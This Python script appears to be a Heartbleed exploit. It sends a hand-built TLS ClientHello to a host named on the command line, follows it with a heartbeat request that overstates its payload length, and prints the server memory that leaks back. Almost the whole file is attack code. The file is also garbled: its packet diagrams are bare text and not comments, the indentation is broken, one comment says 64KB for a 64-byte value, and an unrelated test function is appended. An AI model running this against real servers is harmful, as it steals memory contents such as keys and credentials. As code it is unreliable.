import sys
import socket
import struct
import select
import array




 0                   1                   2                   3  
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|      Type     |        TLS Version            |  Packet .......
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
.... Length     |    Msg Type   |           Message .............         
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
...... Length   |      Client TLS Version       |   Client .....           
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
........................ Random                 |Session ID Len |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Cipher Suite Length     |          Cipher Suites        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Compression Methods     |         Extension Length      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+



clientHello = (
    0x16,             # Type: Handshake record
    0x03, 0x03,       # TLS Version : Version 1.2 
    0x00, 0x2f,       # Packet Length : 47 bytes
    0x01,             # Message Type: Client Hello
    0x00, 0x00, 0x2b, # Message Length : 43 bytes to follow
    0x03, 0x03,       # Client TLS Version: Client support version 1.2 
                      # Client Random  (Nonce) 
    0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x00, 0x01,
    0x02, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x03, 0x04,
    0x05, 0x06, 0x07, 0x08, 0x09, 0x12, 0x13, 0x14, 0x15, 0x16,
    0x17, 0x18,

    0x00,             # Session ID Length
    0x00, 0x02,       # Cipher Suite Length: 2 bytes 
    0x00, 0x2f,       # Cipher Suite - TLS_RSA_WITH_AES_128_CBC_SHA 
    0x01, 0x00,       # Compression: length 0x1 byte & 0x00 (no compression)
    0x00, 0x00,       # Extension Length: 0, No extensions 
)


SERVER_HELLO_DONE = 14 #0x0e

def recv_all(socket, length):
    response = b''
    total_bytes_remaining = length
    while total_bytes_remaining > 0:
        readable, writeable, error = select.select([socket], [], [])
        if socket in readable:
            data = socket.recv(total_bytes_remaining)
            response += data
            total_bytes_remaining -= len(data)
    return response




def readPacket(socket):
    headerLength = 6
    payload = b''
    header =  recv_all(socket, headerLength)
    print(header.hex(" "))
    if header != b'': 
        type, version, length, msgType = struct.unpack('>BHHB',header)
        if length > 0:
            payload +=  recv_all(socket,length - 1)
    else:
        print("Response has no header") 
    return type, version,  payload, msgType




 0                   1                   2                   3  
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|      Type     |             Version           | Packet Length..
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
.............   |    Req/Resp   |         Payload Length        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             payload                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


heartbeat = (
    0x18,        # Type: Heartbeat Message
    0x03, 0x03,  # TLS Version : Version 1.2 
    0x00, 0x03,  # Packet Length : 3 bytes
    0x01,        # Heartbeat Request
    0x00, 0x40   # Payload length 64KB
                )



def readServerHeartBeat(socket):
    payload  = b''
    for i in range(0, 4):
        type, version, packet_payload, msgType =  readPacket(socket)
        payload += packet_payload
    return (type, version,  payload, msgType)



def exploit(socket):
   HEART_BEAT_RESPONSE = 21 #0x15
   payload = b''
   socket.send(array.array('B', heartbeat))
   print("Sent Heartbeat ")
   type, version, payload, msgType = readServerHeartBeat(socket)
   if type is not None: 
      if msgType ==  HEART_BEAT_RESPONSE :
           print(payload.decode('utf-8'))
    else:
        print("No heartbeat received")
    socket.close()



def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((sys.argv[1], 443))
     s.send(array.array('B',clientHello))
     serverHelloDone = False
     while not serverHelloDone: 
        type, version, payload, msgType  = readPacket(s)
        if (msgType == SERVER_HELLO_DONE):
            serverHelloDone = True
     exploit(s)
if __name__ == '__main__':
    main()
    


def testFunction(a,b,c):
	x, y, z = 0, 0, 0
	if (a): 
	    x = -2
	if (b < 5):
		if (not a and c): 
			y = 1
		z = 2
	assert(x + y + z != 3)
